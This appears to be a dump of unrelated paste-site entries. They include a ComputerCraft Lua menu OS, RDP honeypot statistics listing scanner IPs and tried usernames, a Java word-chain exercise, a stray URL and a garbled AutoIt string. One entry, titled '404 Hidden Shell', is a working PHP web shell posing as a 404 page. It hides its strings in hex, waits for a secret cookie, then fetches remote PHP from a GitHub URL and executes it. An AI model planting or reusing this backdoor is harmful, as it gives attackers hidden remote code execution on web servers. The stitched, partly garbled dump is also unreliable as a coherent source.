+    term.setTextColor(colors.lightGray)
+    local subtitle = ""Select a program to run""
+    local subtitleX = math.floor((w - #subtitle) / 2) + 1
+    term.setCursorPos(subtitleX, 3)
+    term.write(subtitle)
+    
+    -- Separator line
+    term.setCursorPos(1, 5)
+    term.setTextColor(colors.gray)
+    term.write(string.rep(""-"", w))
+end
+
+local function drawMenuItem(index, item, isSelected)
+    local w, h = term.getSize()
+    local y = 6 + index
+    
+    if y > h - 2 then
+        return
+    end
+    
+    term.setCursorPos(1, y)
+    
+    if isSelected then
+        term.setTextColor(colors.black)
+        term.setBackgroundColor(colors.white)
+        term.write("" > "" .. item.name)
+        
+        -- Fill spaces
+        local spaces = w - #item.name - 3 - #item.description
+        if spaces > 0 then
+            term.write(string.rep("" "", spaces))
+        end
+        term.write(item.description .. "" "")
+    else
+        term.setTextColor(colors.white)
+        term.setBackgroundColor(colors.black)
+        term.write(""   "" .. item.name)
+        
+        -- Description on the right
+        local spaces = w - #item.name - 3 - #item.description
+        if spaces > 0 then
+            term.write(string.rep("" "", spaces))
+            term.setTextColor(colors.lightGray)
+            term.write(item.description)
+        end
+    end
+    
+    -- Reset colors
+    term.setTextColor(colors.white)
+    term.setBackgroundColor(colors.black)
+end
+
+local function drawFooter()
+    local w, h = term.getSize()
+    
+    term.setCursorPos(1, h - 1)
+    term.setTextColor(colors.gray)
+    term.write(string.rep(""-"", w))
+    
+    term.setCursorPos(2, h)
+    term.setTextColor(colors.lightGray)
+    term.write(""Arrow Keys: navigate | Enter: select"")
+end
+
+local function drawMenu()
+    clearScreen()
+    drawHeader()
+    
+    for i, item in ipairs(menuItems) do
+        drawMenuItem(i, item, i == selectedIndex)
+    end
+    
+    drawFooter()
+end
+
+-- File Manager functionality
+local function showFileManager()
+    local currentPath = """"
+    local files = {}
+    local selectedFile = 1
+    local fileManagerRunning = true
+    local scrollOffset = 0
+    local maxDisplayFiles = 15
+    
+    local function loadFiles(path)
+        files = {}
+        local fullPath = path == """" and ""/"" or path
+        
+        -- Add parent directory option if not in root
+        if path ~= """" then
+            table.insert(files, {name = "".."", type = ""directory"", path = fs.getDir(path)})
+        end
+        
+        -- Get all files and directories
+        if fs.exists(fullPath) then
+            local items = fs.list(fullPath)
+            for _, item in ipairs(items) do
+                local itemPath = fs.combine(fullPath, item)
+                local fileType = fs.isDir(itemPath) and ""directory"" or ""file""
+                table.insert(files, {name = item, type = fileType, path = itemPath})
+            end
+        end
+        
+        selectedFile = 1
+        scrollOffset = 0
+    end
+    
+    local function drawFileManager()
+        clearScreen()
+        local w, h = term.getSize()
+        
+        -- Header
+        term.setTextColor(colors.blue)
+        local title = ""| File Manager |""
+        local titleX = math.floor((w - #title) / 2) + 1
+        term.setCursorPos(titleX, 2)
+        term.write(title)
+        
+        -- Current path
+        term.setTextColor(colors.lightGray)
+        local pathText = ""Path: /"" .. currentPath
+        term.setCursorPos(2, 4)
+        term.write(pathText)
+        
+        -- Separator
+        term.setCursorPos(1, 5)
+        term.setTextColor(colors.gray)
+        term.write(string.rep(""-"", w))
+        
+        -- File list with scrolling
+        local displayStart = scrollOffset + 1
+        local displayEnd = math.min(#files, scrollOffset + maxDisplayFiles)
+        
+        for i = displayStart, displayEnd do
+            local file = files[i]
+            local y = 6 + (i - displayStart)
+            
+            term.setCursorPos(1, y)
+            
+            if i == selectedFile then
+                term.setTextColor(colors.black)
+                term.setBackgroundColor(colors.white)
+                term.write("" > "")
+            else
+                term.setTextColor(colors.white)
+                term.setBackgroundColor(colors.black)
+                term.write(""   "")
+            end
+            
+            -- File icon and name
+            if file.type == ""directory"" then
+                term.setTextColor(i == selectedFile and colors.black or colors.yellow)
+                term.write(""[DIR] "")
+            else
+                term.setTextColor(i == selectedFile and colors.black or colors.white)
+                term.write(""[FILE] "")
+            end
+            
+            -- Truncate long filenames
+            local displayName = file.name
+            if #displayName > w - 10 then
+                displayName = string.sub(displayName, 1, w - 13) .. ""...""
+            end
+            term.write(displayName)
+            
+            -- Reset colors
+            term.setTextColor(colors.white)
+            term.setBackgroundColor(colors.black)
+        end
+        
+        -- Scroll indicator
+        if #files > maxDisplayFiles then
+            term.setCursorPos(w - 8, h - 2)
+            term.setTextColor(colors.lightGray)
+            term.write(string.format(""%d/%d"", selectedFile, #files))
+        end
+        
+        -- Footer
+        term.setCursorPos(1, h - 1)
+        term.setTextColor(colors.gray)
+        term.write(string.rep(""-"", w))
+        
+        term.setCursorPos(2, h)
+        term.setTextColor(colors.lightGray)
+        term.write(""Arrow Keys: navigate | Enter: open/run | Q: back"")
+    end
+    
+    local function executeFile(filePath)
+        clearScreen()
+        term.setTextColor(colors.yellow)
+        print(""Running: "" .. filePath)
+        print()
+        
+        local success, error = pcall(function()
+            if string.find(filePath, ""%.lua$"") then
+                dofile(filePath)
+            else
+                shell.run(filePath)
+            end
+        end)
+        
+        if not success then
+            term.setTextColor(colors.red)
+            print(""Error: "" .. tostring(error))
+        end
+        
+        term.setTextColor(colors.yellow)
+        print(""\nPress any key to continue..."")
+        os.pullEvent(""key"")
+        drawFileManager()
+    end
+    
+    -- Initialize file manager
+    loadFiles(currentPath)
+    drawFileManager()
+    
+    -- Handle file manager input
+    while fileManagerRunning do
+        local event, key = os.pullEvent(""key"")
+        
+        if key == keys.up then
+            selectedFile = selectedFile - 1
+            if selectedFile < 1 then
+                selectedFile = #files
+            end
+            
+            -- Adjust scroll offset
+            if selectedFile < scrollOffset + 1 then
+                scrollOffset = selectedFile - 1
+            elseif selectedFile > scrollOffset + maxDisplayFiles then
+                scrollOffset = selectedFile - maxDisplayFiles
+            end
+            
+            drawFileManager()
+            
+        elseif key == keys.down then
+            selectedFile = selectedFile + 1
+            if selectedFile > #files then
+                selectedFile = 1
+            end
+            
+            -- Adjust scroll offset
+            if selectedFile < scrollOffset + 1 then
+                scrollOffset = selectedFile - 1
+            elseif selectedFile > scrollOffset + maxDisplayFiles then
+                scrollOffset = selectedFile - maxDisplayFiles
+            end
+            
+            drawFileManager()
+            
+        elseif key == keys.enter then
+            if #files > 0 then
+                local selectedItem = files[selectedFile]
+                if selectedItem.type == ""directory"" then
+                    if selectedItem.name == "".."" then
+                        currentPath = selectedItem.path
+                    else
+                        currentPath = selectedItem.path
+                    end
+                    loadFiles(currentPath)
+                    drawFileManager()
+                else
+                    executeFile(selectedItem.path)
+                end
+            end
+            
+        elseif key == keys.q then
+            fileManagerRunning = false
+        end
+    end
+    
+    drawMenu()
+end
+
+-- Calculator with scrollable menu
+local function calculator()
+    local options = {
+        ""Addition"",
+        ""Subtraction"",
+        ""Multiplication"",
+        ""Division"",
+        ""Back to Menu""
+    }
+
+    local function drawCalculatorMenu(selected)
+        term.clear()
+        term.setCursorPos(1,1)
+        print(""=== Calculator ==="")
+        print(""Use UP/DOWN arrows to navigate, ENTER to select.\n"")
+
+        for i, option in ipairs(options) do
+            if i == selected then
+                term.setTextColor(colors.yellow)
+                print(""> "" .. option)
+                term.setTextColor(colors.white)
+            else
+                print(""  "" .. option)
+            end
+        end
+    end
+
+    local function readNumber(prompt)
+        while true do
+            write(prompt)
+            local input = read()
+            local num = tonumber(input)
+            if num then
+                return num
+            else
+                print(""Invalid input, please enter a number."")
+            end
+        end
+    end
+
+    local selected = 1
+    drawCalculatorMenu(selected)
+
+    while true do
+        local event, key = os.pullEvent(""key"")
+        if key == keys.up then
+            selected = selected - 1
+            if selected < 1 then selected = #options end
+            drawCalculatorMenu(selected)
+        elseif key == keys.down then
+            selected = selected + 1
+            if selected > #options then selected = 1 end
+            drawCalculatorMenu(selected)
+        elseif key == keys.enter then
+            if options[selected] == ""Back to Menu"" then
+                term.clear()
+                return
+            else
+                local a = readNumber(""Enter first number: "")
+                local b = readNumber(""Enter second number: "")
+                local result
+
+                if options[selected] == ""Addition"" then
+                    result = a + b
+                    print(string.format(""Result: %.2f + %.2f = %.2f"", a, b, result))
+                elseif options[selected] == ""Subtraction"" then
+                    result = a - b
+                    print(string.format(""Result: %.2f - %.2f = %.2f"", a, b, result))
+                elseif options[selected] == ""Multiplication"" then
+                    result = a * b
+                    print(string.format(""Result: %.2f * %.2f = %.2f"", a, b, result))
+                elseif options[selected] == ""Division"" then
+                    if b == 0 then
+                        print(""Error: Division by zero is not allowed."")
+                    else
+                        result = a / b
+                        print(string.format(""Result: %.2f / %.2f = %.2f"", a, b, result))
+                    end
+                end
+
+                print(""\nPress any key to return to calculator menu..."")
+                os.pullEvent(""key"")
+                drawCalculatorMenu(selected)
+            end
+        end
+    end
+end
+
+-- Launch selected program or special function
+local function launchProgram(item)
+    if item.type == ""shell"" then
+        clearScreen()
+        shell.run(""shell"")
+        drawMenu()
+        return
+    elseif item.type == ""filemanager"" then
+        showFileManager()
+        return
+    elseif item.type == ""reboot"" then
+        os.reboot()
+        return
+    elseif item.type == ""shutdown"" then
+        os.shutdown()
+        return
+    elseif item.type == ""calculator"" then
+        calculator()
+        drawMenu()
+        return
+    end
+
+    if item.program then
+        clearScreen()
+
+        if fs.exists(item.program) or fs.exists(""rom/programs/"" .. item.program .. "".lua"") then
+            local success, error = pcall(function()
+                shell.run(item.program)
+            end)
+
+            if not success then
+                term.setTextColor(colors.red)
+                print(""Error running program: "" .. tostring(error))
+            end
+        else
+            term.setTextColor(colors.red)
+            print(""Program not found: "" .. item.program)
+        end
+
+        term.setTextColor(colors.yellow)
+        print(""\nPress any key to return to menu..."")
+        os.pullEvent(""key"")
+
+        drawMenu()
+    end
+end
+
+-- Main loop
+drawMenu()
+
+while running do
+    local event, key = os.pullEvent(""key"")
+
+    if key == keys.up then
+        selectedIndex = selectedIndex - 1
+        if selectedIndex < 1 then
+            selectedIndex = #menuItems
+        end
+        drawMenu()
+
+    elseif key == keys.down then
+        selectedIndex = selectedIndex + 1
+        if selectedIndex > #menuItems then
+            selectedIndex = 1
+        end
+        drawMenu()
+
+    elseif key == keys.enter then
+        launchProgram(menuItems[selectedIndex])
+
+    elseif key == keys.q then
+        running = false
+    end
+end
+
+clearScreen()
+term.setCursorPos(1,1)
+print(""Neobox OS Alpha shutting down. Goodbye!"")"
+Es20TZUF,2025-06-07_stats.json,rdp_snitch,JSON,Sunday 8th of June 2025 07:18:19 PM CDT,"{
+  ""ip"": {
+    ""165.232.170.129"": 41709,
+    ""167.172.131.118"": 8514,
+    ""143.198.221.164"": 456,
+    ""103.56.5.14"": 267,
+    ""62.3.42.167"": 6,
+    ""45.227.254.130"": 9,
+    ""91.238.181.91"": 6,
+    ""147.185.132.158"": 12,
+    ""45.227.254.152"": 6,
+    ""80.94.95.203"": 9,
+    ""205.210.31.200"": 9,
+    ""47.120.47.93"": 3,
+    ""193.142.146.227"": 9,
+    ""92.63.197.23"": 9,
+    ""129.227.230.73"": 3,
+    ""172.184.144.136"": 6,
+    ""91.202.233.4"": 12,
+    ""198.235.24.236"": 9,
+    ""152.42.212.148"": 7077,
+    ""104.236.244.191"": 9,
+    ""128.199.168.88"": 4998,
+    ""198.235.24.233"": 9,
+    ""88.214.25.121"": 6,
+    ""91.238.181.94"": 6,
+    ""167.99.236.65"": 15,
+    ""147.185.132.61"": 9,
+    ""47.236.157.151"": 3
+  },
+  ""asn"": {
+    ""AS14061"": 62778,
+    ""AS140599"": 267,
+    ""AS61173"": 6,
+    ""AS267784"": 15,
+    ""AS49434"": 12,
+    ""AS396982"": 48,
+    ""AS204428"": 9,
+    ""AS37963"": 3,
+    ""AS213438"": 9,
+    ""AS210848"": 9,
+    ""AS21859"": 3,
+    ""AS8075"": 6,
+    ""AS200593"": 12,
+    ""AS35042"": 6,
+    ""AS45102"": 3
+  },
+  ""isp"": {
+    ""DigitalOcean, LLC"": 62778,
+    ""Comfac Corporation"": 267,
+    ""Green Web Samaneh Novin PJSC"": 6,
+    ""Flyservers S.A."": 15,
+    ""Datacenter location PAR1 France"": 12,
+    ""Google LLC"": 48,
+    ""SS-Net"": 9,
+    ""Hangzhou Alibaba Advertising Co., Ltd."": 3,
+    ""ColocaTel Inc."": 9,
+    ""Telkom Internet LTD"": 9,
+    ""Zenlayer Inc"": 3,
+    ""Microsoft"": 6,
+    ""Prospero OOO"": 12,
+    ""NOC EMAIL: noc@one-host.net"": 6,
+    ""Alibaba (US) Technology Co., Ltd."": 3
+  },
+  ""org"": {
+    ""DigitalOcean, LLC"": 62763,
+    ""Comfac Corporation"": 267,
+    ""Green Web Samaneh Novin PJSC"": 6,
+    ""Xwin Universal LTD"": 15,
+    ""ThinkTech Technology Industrial CO. Limited"": 18,
+    ""Palo Alto Networks, Inc"": 48,
+    ""Unmanaged LTD"": 9,
+    ""Alibaba.com LLC"": 6,
+    ""ColocaTel Inc"": 9,
+    ""Korotkij Denis Aleksandrovich"": 9,
+    ""NetProtect LLC"": 3,
+    ""Microsoft Azure Cloud (westus)"": 6,
+    ""Prospero OOO"": 12,
+    ""Digital Ocean"": 15
+  },
+  ""regionName"": {
+    ""South West"": 54240,
+    ""New Jersey"": 8538,
+    ""Metro Manila"": 267,
+    ""Razavi Khorasan"": 6,
+    ""Vilnius"": 15,
+    ""\u00cele-de-France"": 12,
+    ""California"": 54,
+    ""Budapest"": 9,
+    ""Guangdong"": 3,
+    ""North Holland"": 18,
+    ""Bangkok"": 3,
+    ""Ashgabat"": 12,
+    ""Kowloon City"": 6,
+    ""North West"": 3
+  },
+  ""country"": {
+    ""Singapore"": 54243,
+    ""United States"": 8592,
+    ""Philippines"": 267,
+    ""Iran"": 6,
+    ""Lithuania"": 15,
+    ""France"": 12,
+    ""Hungary"": 9,
+    ""China"": 3,
+    ""The Netherlands"": 18,
+    ""Thailand"": 3,
+    ""Turkmenistan"": 12,
+    ""Hong Kong"": 6
+  },
+  ""account"": {
+    ""hello"": 63063,
+    ""Domain"": 18,
+    ""Test"": 27,
+    ""yhDxyQONx"": 6,
+    ""nmap"": 3,
+    ""naap"": 3,
+    ""Administr"": 30,
+    ""dRMIARzYe"": 3,
+    ""ZzDQaL"": 3,
+    ""TYPoLW"": 3,
+    ""PVSCsdRvF"": 3,
+    ""wVhDlN"": 3,
+    ""SoFYtc"": 3,
+    ""dFAyiNgDf"": 3,
+    ""NRWHgv"": 3,
+    ""hxudXJ"": 3,
+    ""HgZvDBanI"": 3,
+    ""TGZddU"": 3,
+    ""VKzioF"": 3
+  },
+  ""keyboard"": {
+    ""Unknown"": 63186
+  },
+  ""client_build"": {
+    ""Unknown"": 63186
+  },
+  ""client_name"": {
+    ""Unknown"": 63186
+  },
+  ""ip_type"": {
+    ""hosting"": 62856,
+    ""Unknown"": 327,
+    ""mobile & hosting & proxy"": 3
+  }
+}"
+HJ24vp0K,2025-06-07_stats.json,rdp_snitch,JSON,Sunday 8th of June 2025 07:16:22 PM CDT,"{
+  ""ip"": {
+    ""165.232.170.129"": 41707,
+    ""167.172.131.118"": 8514,
+    ""143.198.221.164"": 456,
+    ""103.56.5.14"": 267,
+    ""62.3.42.167"": 6,
+    ""45.227.254.130"": 9,
+    ""91.238.181.91"": 6,
+    ""147.185.132.158"": 12,
+    ""45.227.254.152"": 6,
+    ""80.94.95.203"": 9,
+    ""205.210.31.200"": 9,
+    ""47.120.47.93"": 3,
+    ""193.142.146.227"": 9,
+    ""92.63.197.23"": 9,
+    ""129.227.230.73"": 3,
+    ""172.184.144.136"": 6,
+    ""91.202.233.4"": 12,
+    ""198.235.24.236"": 9,
+    ""152.42.212.148"": 7077,
+    ""104.236.244.191"": 9,
+    ""128.199.168.88"": 4998,
+    ""198.235.24.233"": 9,
+    ""88.214.25.121"": 6,
+    ""91.238.181.94"": 6,
+    ""167.99.236.65"": 15,
+    ""147.185.132.61"": 9,
+    ""47.236.157.151"": 3
+  },
+  ""asn"": {
+    ""AS14061"": 62776,
+    ""AS140599"": 267,
+    ""AS61173"": 6,
+    ""AS267784"": 15,
+    ""AS49434"": 12,
+    ""AS396982"": 48,
+    ""AS204428"": 9,
+    ""AS37963"": 3,
+    ""AS213438"": 9,
+    ""AS210848"": 9,
+    ""AS21859"": 3,
+    ""AS8075"": 6,
+    ""AS200593"": 12,
+    ""AS35042"": 6,
+    ""AS45102"": 3
+  },
+  ""isp"": {
+    ""DigitalOcean, LLC"": 62776,
+    ""Comfac Corporation"": 267,
+    ""Green Web Samaneh Novin PJSC"": 6,
+    ""Flyservers S.A."": 15,
+    ""Datacenter location PAR1 France"": 12,
+    ""Google LLC"": 48,
+    ""SS-Net"": 9,
+    ""Hangzhou Alibaba Advertising Co., Ltd."": 3,
+    ""ColocaTel Inc."": 9,
+    ""Telkom Internet LTD"": 9,
+    ""Zenlayer Inc"": 3,
+    ""Microsoft"": 6,
+    ""Prospero OOO"": 12,
+    ""NOC EMAIL: noc@one-host.net"": 6,
+    ""Alibaba (US) Technology Co., Ltd."": 3
+  },
+  ""org"": {
+    ""DigitalOcean, LLC"": 62761,
+    ""Comfac Corporation"": 267,
+    ""Green Web Samaneh Novin PJSC"": 6,
+    ""Xwin Universal LTD"": 15,
+    ""ThinkTech Technology Industrial CO. Limited"": 18,
+    ""Palo Alto Networks, Inc"": 48,
+    ""Unmanaged LTD"": 9,
+    ""Alibaba.com LLC"": 6,
+    ""ColocaTel Inc"": 9,
+    ""Korotkij Denis Aleksandrovich"": 9,
+    ""NetProtect LLC"": 3,
+    ""Microsoft Azure Cloud (westus)"": 6,
+    ""Prospero OOO"": 12,
+    ""Digital Ocean"": 15
+  },
+  ""regionName"": {
+    ""South West"": 54238,
+    ""New Jersey"": 8538,
+    ""Metro Manila"": 267,
+    ""Razavi Khorasan"": 6,
+    ""Vilnius"": 15,
+    ""\u00cele-de-France"": 12,
+    ""California"": 54,
+    ""Budapest"": 9,
+    ""Guangdong"": 3,
+    ""North Holland"": 18,
+    ""Bangkok"": 3,
+    ""Ashgabat"": 12,
+    ""Kowloon City"": 6,
+    ""North West"": 3
+  },
+  ""country"": {
+    ""Singapore"": 54241,
+    ""United States"": 8592,
+    ""Philippines"": 267,
+    ""Iran"": 6,
+    ""Lithuania"": 15,
+    ""France"": 12,
+    ""Hungary"": 9,
+    ""China"": 3,
+    ""The Netherlands"": 18,
+    ""Thailand"": 3,
+    ""Turkmenistan"": 12,
+    ""Hong Kong"": 6
+  },
+  ""account"": {
+    ""hello"": 63061,
+    ""Domain"": 18,
+    ""Test"": 27,
+    ""yhDxyQONx"": 6,
+    ""nmap"": 3,
+    ""naap"": 3,
+    ""Administr"": 30,
+    ""dRMIARzYe"": 3,
+    ""ZzDQaL"": 3,
+    ""TYPoLW"": 3,
+    ""PVSCsdRvF"": 3,
+    ""wVhDlN"": 3,
+    ""SoFYtc"": 3,
+    ""dFAyiNgDf"": 3,
+    ""NRWHgv"": 3,
+    ""hxudXJ"": 3,
+    ""HgZvDBanI"": 3,
+    ""TGZddU"": 3,
+    ""VKzioF"": 3
+  },
+  ""keyboard"": {
+    ""Unknown"": 63184
+  },
+  ""client_build"": {
+    ""Unknown"": 63184
+  },
+  ""client_name"": {
+    ""Unknown"": 63184
+  },
+  ""ip_type"": {
+    ""hosting"": 62854,
+    ""Unknown"": 327,
+    ""mobile & hosting & proxy"": 3
+  }
+}"
+xUL6iqvH,2025-06-07_stats.json,rdp_snitch,JSON,Sunday 8th of June 2025 07:15:12 PM CDT,"{
+  ""ip"": {
+    ""165.232.170.129"": 41705,
+    ""167.172.131.118"": 8514,
+    ""143.198.221.164"": 456,
+    ""103.56.5.14"": 267,
+    ""62.3.42.167"": 6,
+    ""45.227.254.130"": 9,
+    ""91.238.181.91"": 6,
+    ""147.185.132.158"": 12,
+    ""45.227.254.152"": 6,
+    ""80.94.95.203"": 9,
+    ""205.210.31.200"": 9,
+    ""47.120.47.93"": 3,
+    ""193.142.146.227"": 9,
+    ""92.63.197.23"": 9,
+    ""129.227.230.73"": 3,
+    ""172.184.144.136"": 6,
+    ""91.202.233.4"": 12,
+    ""198.235.24.236"": 9,
+    ""152.42.212.148"": 7077,
+    ""104.236.244.191"": 9,
+    ""128.199.168.88"": 4998,
+    ""198.235.24.233"": 9,
+    ""88.214.25.121"": 6,
+    ""91.238.181.94"": 6,
+    ""167.99.236.65"": 15,
+    ""147.185.132.61"": 9,
+    ""47.236.157.151"": 3
+  },
+  ""asn"": {
+    ""AS14061"": 62774,
+    ""AS140599"": 267,
+    ""AS61173"": 6,
+    ""AS267784"": 15,
+    ""AS49434"": 12,
+    ""AS396982"": 48,
+    ""AS204428"": 9,
+    ""AS37963"": 3,
+    ""AS213438"": 9,
+    ""AS210848"": 9,
+    ""AS21859"": 3,
+    ""AS8075"": 6,
+    ""AS200593"": 12,
+    ""AS35042"": 6,
+    ""AS45102"": 3
+  },
+  ""isp"": {
+    ""DigitalOcean, LLC"": 62774,
+    ""Comfac Corporation"": 267,
+    ""Green Web Samaneh Novin PJSC"": 6,
+    ""Flyservers S.A."": 15,
+    ""Datacenter location PAR1 France"": 12,
+    ""Google LLC"": 48,
+    ""SS-Net"": 9,
+    ""Hangzhou Alibaba Advertising Co., Ltd."": 3,
+    ""ColocaTel Inc."": 9,
+    ""Telkom Internet LTD"": 9,
+    ""Zenlayer Inc"": 3,
+    ""Microsoft"": 6,
+    ""Prospero OOO"": 12,
+    ""NOC EMAIL: noc@one-host.net"": 6,
+    ""Alibaba (US) Technology Co., Ltd."": 3
+  },
+  ""org"": {
+    ""DigitalOcean, LLC"": 62759,
+    ""Comfac Corporation"": 267,
+    ""Green Web Samaneh Novin PJSC"": 6,
+    ""Xwin Universal LTD"": 15,
+    ""ThinkTech Technology Industrial CO. Limited"": 18,
+    ""Palo Alto Networks, Inc"": 48,
+    ""Unmanaged LTD"": 9,
+    ""Alibaba.com LLC"": 6,
+    ""ColocaTel Inc"": 9,
+    ""Korotkij Denis Aleksandrovich"": 9,
+    ""NetProtect LLC"": 3,
+    ""Microsoft Azure Cloud (westus)"": 6,
+    ""Prospero OOO"": 12,
+    ""Digital Ocean"": 15
+  },
+  ""regionName"": {
+    ""South West"": 54236,
+    ""New Jersey"": 8538,
+    ""Metro Manila"": 267,
+    ""Razavi Khorasan"": 6,
+    ""Vilnius"": 15,
+    ""\u00cele-de-France"": 12,
+    ""California"": 54,
+    ""Budapest"": 9,
+    ""Guangdong"": 3,
+    ""North Holland"": 18,
+    ""Bangkok"": 3,
+    ""Ashgabat"": 12,
+    ""Kowloon City"": 6,
+    ""North West"": 3
+  },
+  ""country"": {
+    ""Singapore"": 54239,
+    ""United States"": 8592,
+    ""Philippines"": 267,
+    ""Iran"": 6,
+    ""Lithuania"": 15,
+    ""France"": 12,
+    ""Hungary"": 9,
+    ""China"": 3,
+    ""The Netherlands"": 18,
+    ""Thailand"": 3,
+    ""Turkmenistan"": 12,
+    ""Hong Kong"": 6
+  },
+  ""account"": {
+    ""hello"": 63059,
+    ""Domain"": 18,
+    ""Test"": 27,
+    ""yhDxyQONx"": 6,
+    ""nmap"": 3,
+    ""naap"": 3,
+    ""Administr"": 30,
+    ""dRMIARzYe"": 3,
+    ""ZzDQaL"": 3,
+    ""TYPoLW"": 3,
+    ""PVSCsdRvF"": 3,
+    ""wVhDlN"": 3,
+    ""SoFYtc"": 3,
+    ""dFAyiNgDf"": 3,
+    ""NRWHgv"": 3,
+    ""hxudXJ"": 3,
+    ""HgZvDBanI"": 3,
+    ""TGZddU"": 3,
+    ""VKzioF"": 3
+  },
+  ""keyboard"": {
+    ""Unknown"": 63182
+  },
+  ""client_build"": {
+    ""Unknown"": 63182
+  },
+  ""client_name"": {
+    ""Unknown"": 63182
+  },
+  ""ip_type"": {
+    ""hosting"": 62852,
+    ""Unknown"": 327,
+    ""mobile & hosting & proxy"": 3
+  }
+}"
+TideJi6m,GeoWealth Homework,Petrov4o,Java,Sunday 8th of June 2025 06:59:07 PM CDT,"import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.URL;
+import java.util.*;
+import java.util.stream.Collectors;
+
+public class WordReducer
+{
+    private static final String WORDS_URL = ""https://raw.githubusercontent.com/nikiiv/JavaCodingTestOne/master/scrabble-words.txt"";
+    private static final Set<String> VALID_ONE_LETTER_WORDS = Set.of(""I"", ""A"");
+
+    private Set<String> dictionary;
+
+    public static void main(String[] args) throws Exception
+    {
+        WordReducer reducer = new WordReducer();
+        reducer.populateDictionary();
+
+        System.out.println(""Dictionary loaded with "" + reducer.dictionary.size() + "" words.\n"");
+
+        List<String> allNineLetterWords = reducer.dictionary.stream()
+                .filter(w -> w.length() == 9)
+                .toList();
+
+        for (String word : allNineLetterWords)
+        {
+            List<String> chain = reducer.findSubWordChainBFS(word);
+            if (chain != null)
+            {
+                System.out.println(""Chain found: "" + chain);
+            }
+        }
+    }
+
+    public void populateDictionary() throws Exception
+    {
+        URL url = new URL(WORDS_URL);
+        try (BufferedReader br = new BufferedReader(new InputStreamReader(url.openConnection().getInputStream())))
+        {
+            dictionary = br.lines()
+                    .skip(1)
+                    .map(String::trim)
+                    .filter(line -> !line.isEmpty())
+                    .map(String::toUpperCase)
+                    .filter(word -> word.length() != 1 || VALID_ONE_LETTER_WORDS.contains(word))
+                    .collect(Collectors.toSet());
+        }
+        dictionary.add(""I"");
+        dictionary.add(""A"");
+    }
+
+    public List<String> AllSubWordsFromWord(String word)
+    {
+        List<String> subWords = new ArrayList<>();
+        for (int i = 0; i < word.length(); i++)
+        {
+            String sub = word.substring(0, i) + word.substring(i + 1);
+            subWords.add(sub);
+        }
+        subWords.removeIf(String::isEmpty);
+        return subWords.stream().distinct().collect(Collectors.toList());
+    }
+
+    public List<String> findSubWordChainBFS(String startWord)
+    {
+        if (!dictionary.contains(startWord))
+        {
+            return null;
+        }
+
+        Queue<List<String>> queue = new LinkedList<>();
+        queue.add(List.of(startWord));
+
+        Set<String> visited = new HashSet<>();
+        visited.add(startWord);
+
+        while (!queue.isEmpty())
+        {
+            List<String> currentChain = queue.poll();
+            String currentWord = currentChain.get(currentChain.size() - 1);
+
+            if (currentWord.length() == 1 && VALID_ONE_LETTER_WORDS.contains(currentWord))
+            {
+                return currentChain;
+            }
+
+            List<String> validSubWords = AllSubWordsFromWord(currentWord).stream()
+                    .map(String::toUpperCase)
+                    .filter(dictionary::contains)
+                    .filter(word -> !visited.contains(word))
+                    .toList();
+
+            for (String subWord : validSubWords)
+            {
+                List<String> newChain = new ArrayList<>(currentChain);
+                newChain.add(subWord);
+                queue.add(newChain);
+                visited.add(subWord);
+            }
+        }
+        return null;
+    }
+}
+"
+SUQGEyDh,404 Hidden Shell,willysec_id,PHP,Sunday 8th of June 2025 06:56:08 PM CDT,"<?php
+@ini_set('display_errors',0);
+function _x7k9p($s){
+    $r='';
+    for($i=0;$i<strlen($s);$i+=2){
+        $r.=chr(hexdec(substr($s,$i,2)));
+    }
+    return $r;
+}
+function _z3m5q($u){
+    if(function_exists('curl_exec')){
+        $c=curl_init($u);
+        curl_setopt_array($c,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_USERAGENT=>'Mozilla/5.0',CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_SSL_VERIFYHOST=>0]);
+        $r=curl_exec($c);
+        curl_close($c);
+        return $r;
+    }
+    return false;
+}
+function _y4n2j(){
+    $a=_x7k9p('6c757368');
+    return isset($_COOKIE[$a])&&$_COOKIE[$a]===_x7k9p('666c61766f72');
+}
+if(_y4n2j()){
+    $u=_x7k9p('68747470733a2f2f')._x7k9p('7261772e67697468756275736572636f6e74656e742e636f6d2f64616e313538342f617366646173').'/'._x7k9p('726566732f68656164732f6d61696e2f6173772e706870');
+    $d=_z3m5q($u);
+    if($d!==false){
+        $randDir='/tmp/tmp_'.uniqid().'_'.rand(1000,9999);
+        $randFile=$randDir.'/temp_'.md5(uniqid()).'.'.strtolower('php');
+        mkdir($randDir, 0775, true);
+        call_user_func(_x7k9p('66696c655f7075745f636f6e74656e7473'), $randFile, $d);
+        include $randFile;
+        unlink($randFile);
+        rmdir($randDir);
+    }
+    else{
+        echo '?'.$u;
+    }
+    exit;
+}
+?><!DOCTYPE html><html><head><title>404 Not Found</title><meta name=""robots"" content=""noindex,nofollow""><style>html,body{margin:0;padding:0;overflow:hidden;width:100%;height:100%}body{font-family:sans-serif}iframe{position:absolute;top:0;left:0;border:none;width:100%;height:100%}</style></head><body><iframe src=""//<?php echo $_SERVER['SERVER_NAME']; ?>/404"" id=""iframe_id"" onload=""document.title=this.contentDocument ? this.contentDocument.title : this.contentWindow.document.title;""></iframe></body></html>"
+XUrqYsv5,OS - Startup,Rukerisu,Lua,Sunday 8th of June 2025 06:45:22 PM CDT,"term.clear()
+term.setBackgroundColor(colors.black)
+term.setTextColor(colors.white)
+
+local w, h = term.getSize()
+
+-- Function for middle text
+local function printCentered(y, text, color)
+    local x = math.floor((w - #text) / 2)
+    term.setCursorPos(x, y)
+    if color then
+        term.setTextColor(color)
+    else
+        term.setTextColor(colors.white)
+    end
+    term.write(text)
+end
+
+-- Calculation of Vertical Mid
+local centerY = math.floor(h / 2)
+
+-- Name of OS
+printCentered(centerY - 2, ""| OS NAME |"", colors.blue)
+
+-- Loading Text
+printCentered(centerY, ""Loading..."")
+
+-- Progress bar
+sleep(1)
+term.setCursorPos(math.floor((w - 10) / 2), centerY + 2)
+textutils.slowPrint(""##########"")
+sleep(1)
+
+-- Start Menu
+shell.run("".menu"")"
+nBZXQHMA,Untitled,Nobodyking,Bash,Sunday 8th of June 2025 05:58:31 PM CDT,http://sub35nj7kmmlk.shop/
+yh2d6KDL,Untitled,TakePen,AutoIt,Sunday 8th of June 2025 05:19:45 PM CDT,vtPo3hYnhlm7nnVBp4quqqqqqq#zfgsrP07HwrHPHbcWwWsrP07Hwr11bcWwWsrP07Hwrxg1elbBbp2rwHPTbt9KvKFyFeeeep2rHb58qq#ygbPTd9
